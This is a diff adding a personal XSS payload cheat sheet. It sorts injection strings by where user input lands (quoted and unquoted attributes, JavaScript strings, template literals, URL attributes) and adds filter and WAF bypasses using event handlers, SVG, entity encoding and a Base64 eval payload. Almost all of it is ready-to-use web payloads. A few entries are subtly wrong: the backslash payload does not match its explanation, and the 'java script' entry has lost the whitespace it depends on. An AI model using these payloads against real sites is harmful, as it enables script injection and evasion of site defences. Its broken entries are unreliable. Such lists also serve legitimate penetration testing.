@@ -1,0 +1,73 @@
+*Use these when your input is placed inside a tag's attribute.*
+
+1. **`"><script>alert(1)</script>`**
+    - **When to use:** Standard breakout from a double-quoted attribute.
+    - **Why:** Closes the attribute and the tag, then starts a new script tag.
+2. **`'><script>alert(1)</script>`**
+    - **When to use:** Breakout from a single-quoted attribute.
+3. **`" onmouseover="alert(1)`**
+    - **When to use:** When `<` and `>` are blocked but quotes are allowed.
+    - **Why:** Adds a new event handler to the existing tag.
+4. **`" autofocus onfocus="alert(1)`**
+    - **When to use:** To trigger the alert automatically without user interaction.
+5. **`" type="image" src="x" onerror="alert(1)`**
+    - **When to use:** Injecting into a hidden input field.
+    - **Why:** Changes the input type to something visible/loadable to trigger an error
+
+# Context: Unquoted Attributes (`value=USER_INPUT`)
+
+*Use these when there are no quotes around your input.*
+
+1. **`x onmouseover=alert(1)`**
+    - **When to use:** Simplest breakout (just a space).
+2. **`x/onmouseover=alert(1)`**
+- **When to use:** When spaces are filtered or blocked.
+- **Why:** Browsers often treat `/` as a separator between attributes.
+
+# Context: Inside JavaScript Blocks (`<script>var x = "..."</script>`)
+
+*Use these when you are already inside a script tag.*
+
+1. **`";alert(1);//`**
+    - **When to use:** Inside a double-quoted JS variable.
+    - **Why:** Closes the string ends the line and comments out the rest.
+2. **`';alert(1);//`**
+    - **When to use:** Inside a sinle-quoted JS variable.
+3. **`\-alert(1)//`**
+    - **When to use:** When your quote is escaped like `\"`.
+    - **Why:** Adding a backslash makes the code `\\"`, which escapes the filter's escape.
+4. **`</script><script>alert(1)</script>`**
+    - **When to use:** The Nuclear option for JS strings.
+    - **Why:** Browsers stop parsing at `</script>` even inside quotes.
+5. **`${alert(1)}`**
+    - **When to use:** Inside backtick template literals (``USER_INPUT``).
+
+Context: URL Attributes (`href="USER_INPUT"` or `src="USER_INPUT"`)
+
+*Use these when your input becomes a link or source.*
+
+1. **`javascript:alert(1)`**
+    - **When to use:** Directly inside `href` or `src`.
+2. **`java script:alert(1)`**
+    - **When to use:** Basic filter bypass using a newline/tab.
+3. **`&#106;avascript:alert(1)`**
+    - **When to use:** When javascript is blacklisted.
+    - **Why:** Uses HTML encoding to hide the keyword.
+
+# Context: Filter & WAF Bypasses
+
+*Use these when common words like alert or script are blocked.*
+
+1. **`<details open ontoggle=alert(1)>`**
+    - **When to use:** When `<script>` or `onmouseover` are blocked.
+2. **`<svg onload=alert(1)>`**
+    - **When to use:** To trigger a payload immediately using SVG.
+3. **`prompt(1)` or `confirm(1)`**
+    - **When to use:** When `alert` is explicitly blacklisted.
+4. **`alert`1``**
+    - **When to use:** When parentheses `()` are blocked.
+5. **`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`**
+    - **When to use:** When the payload needs to be completely hidden.
+    - **Why:** Uses Base64 encoding to hide "alert(1)".
+
+these are just basic example that i use but remember that real world is always complex and different there security filters so you have consider  that
